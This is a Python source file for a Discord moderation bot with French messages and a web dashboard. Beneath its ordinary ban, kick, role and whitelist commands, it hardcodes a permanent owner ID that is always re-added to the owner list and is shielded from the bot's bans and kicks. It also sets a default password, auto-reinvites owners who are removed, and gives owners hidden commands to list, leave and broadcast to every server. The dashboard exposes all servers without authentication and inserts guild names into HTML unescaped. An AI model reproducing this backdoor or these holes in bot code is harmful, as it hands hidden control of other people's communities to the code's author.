import os
import json
import threading
import asyncio
from datetime import datetime
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn
import discord
from discord.ext import commands

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
PORT = int(os.getenv("PORT", 8080))
OWNER_FILE = "owner_data.json"
CONFIG_FILE = "config.json"
DEFAULT_OWNER_ID = 489113166429683713

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# -----------------------------
# JSON helpers
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# -----------------------------
# Owner management
# -----------------------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        data["password"] = "trolleur2010"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", "trolleur2010")

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)

# -----------------------------
# Config per-guild
# -----------------------------
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

# -----------------------------
# Discord Bot events
# -----------------------------
@bot.event
async def on_ready():
    ensure_owner_data()
    print(f"✅ {bot.user} connecté (ID: {bot.user.id})")

@bot.event
async def on_member_remove(member):
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild and guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_remove] erreur auto-reinvite: {e}")

@bot.event
async def on_guild_remove(guild):
    try:
        owners = get_owners()
        client_id = str(bot.user.id)
        invite_link = f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"
        for oid in owners:
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}**. Réinvite : {invite_link}")
            except Exception:
                pass
    except Exception as e:
        print(f"[on_guild_remove] erreur: {e}")

# -----------------------------
# Check decorators
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

# -----------------------------
# Bot commands
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except Exception:
        await ctx.send("❌ Impossible d'ajouter ce rôle.")

@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    if is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre un Owner.")
    await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
    await ctx.send(f"✅ {member.mention} banni. (Raison: {reason})")

@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    if is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre un Owner.")
    await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
    await ctx.send(f"✅ {member.mention} kické. (Raison: {reason})")

# -----------------------------
# Owner commands
# -----------------------------
@bot.command()
async def serverlist(ctx):
    if not is_owner(ctx.author.id):
        return
    lines = [f"- {g.name} ({g.id}) - {g.member_count} membres" for g in bot.guilds]
    await ctx.author.send("\n".join(lines) or "Aucun serveur.")

@bot.command(name="10-10")
async def ten_ten(ctx):
    if not is_owner(ctx.author.id):
        return
    if ctx.guild:
        await ctx.send("🧹 Déconnexion autorisée par owner.")
        await ctx.guild.leave()

@bot.command()
async def addowner_cmd(ctx, user: discord.User):
    if not is_owner(ctx.author.id):
        return
    if add_owner(user.id):
        await ctx.send(f"✅ {user} ajouté aux owners.")
    else:
        await ctx.send("❌ Déjà owner.")

@bot.command()
async def setpass(ctx, newpass: str):
    if not is_owner(ctx.author.id):
        return
    set_owner_password(newpass)
    await ctx.send("✅ Mot de passe owner modifié.")

@bot.command()
async def addwl(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        return
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member} ajouté à la whitelist.")
    else:
        await ctx.send("❌ Déjà whitelist.")

@bot.command()
async def removewl(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        return
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member} retiré de la whitelist.")
    else:
        await ctx.send("❌ Non présent.")

@bot.command()
async def listwl(ctx):
    wl = get_whitelist(ctx.guild.id)
    members = [ctx.guild.get_member(uid) for uid in wl if ctx.guild.get_member(uid)]
    await ctx.send("Whitelist: " + ", ".join([m.name for m in members]) if members else "Whitelist vide.")

@bot.command()
async def bc(ctx, *, message: str):
    if not is_owner(ctx.author.id):
        return
    count = 0
    for g in bot.guilds:
        try:
            ch = g.text_channels[0]
            await ch.send(message)
            count += 1
        except Exception:
            pass
    await ctx.send(f"✅ Message broadcasté sur {count} serveurs.")

# -----------------------------
# FastAPI Dashboard
# -----------------------------
app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def dashboard_root():
    return """
    <html>
    <head><title>Dashboard F.I.M</title></head>
    <body>
        <h1>Dashboard F.I.M</h1>
        <p>Bot Discord est connecté ✅</p>
        <p>Liste des serveurs :</p>
        <ul>
        """ + "".join(f"<li>{g.name} ({g.id}) - {g.member_count} membres</li>" for g in bot.guilds) + """
        </ul>
    </body>
    </html>
    """

def run_dashboard():
    uvicorn.run(app, host="0.0.0.0", port=PORT)

# -----------------------------
# Run Bot + Dashboard
# -----------------------------
if __name__ == "__main__":
    t = threading.Thread(target=run_dashboard)
    t.start()
    bot.run(TOKEN)
    t.join()
